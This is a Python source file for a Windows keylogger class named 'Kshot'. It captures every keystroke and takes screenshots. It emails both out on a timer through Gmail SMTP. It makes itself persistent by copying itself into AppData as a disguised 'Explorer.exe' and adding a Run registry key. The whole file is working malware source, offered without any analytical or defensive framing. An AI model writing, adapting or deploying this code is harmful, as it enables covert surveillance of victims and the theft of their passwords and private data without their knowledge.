#!/usr/bin/python
from email import encoders
from email.mime.base import MIMEBase
import os
import shutil
import subprocess
import sys
import pynput.keyboard
import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PIL import ImageGrab
import io


class Kshot:
    def __init__(self, time_interval, email, password):
        # constructor
        self.logger = "[Keylogger Initiated]"
        self.subject = "Keylogger Report Email"
        self.email = email
        self.password = password
        self.interval = time_interval

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike

    def evaluate_keys(self, key):
        try:
            # This will not throw exceptions when encountering a special character
            Pressed_key = str(key.char)
        except AttributeError:
            # The case is for encountering a special character (space, tab, ctrl, Enter etc...)
            # TODO: include as many if as need to remove unwanted special characters
            if key == key.space:  # Show actual space instead of key.space
                Pressed_key = " "
            else:
                Pressed_key = " " + str(key) + " "

        # Now appending the key pressed
        self.append_to_log(Pressed_key)

    def report(self):
        # print(self.logger)
        # sending the email of what has been logged
        self.send_app_mail(self.email, self.password,
                           self.subject, self.logger)
        self.logger = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, subject, message):
        Email_message = 'Subject: {}\n\n{}'.format(subject, message)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.send_message(Email_message)
        server.quit()

    def capture_screenshot(self, filename='screenshot.png'):
        screenshot = ImageGrab.grab()

        # Guarda la captura en un buffer de bytes
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        return screenshot_bytes

    def send_app_mail(self, username, password, subject, message, screenshot_filename='screenshot.png'):
        msg = MIMEMultipart()
        msg['From'] = username
        msg['To'] = username
        msg['Subject'] = subject

        body = message
        msg.attach(MIMEText(body, 'plain'))

        screenshot_bytes = self.capture_screenshot(screenshot_filename)

        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(screenshot_bytes.read())
        encoders.encode_base64(attachment)
        attachment.add_header(
            'Content-Disposition',
            f'attachment; filename={screenshot_filename}',
        )
        msg.attach(attachment)

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(username, password)
            server.send_message(msg)
            print('Correo enviado exitosamente.')
        except Exception as e:
            print(f'Error: {e}')
        finally:
            server.quit()

    def add_registry(self):
        # Write the program to registry so that it runs with startup
        # Copy keylogger to Appdata folder
        keylogger_location = os.environ["appdata"] + "\\Explorer.exe"
        if not os.path.exists(keylogger_location):
            shutil.copyfile(sys.executable, keylogger_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /t REG_SZ /d "' +
                            keylogger_location + '"', shell=True)

    def run(self):
        self.add_registry()
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.evaluate_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
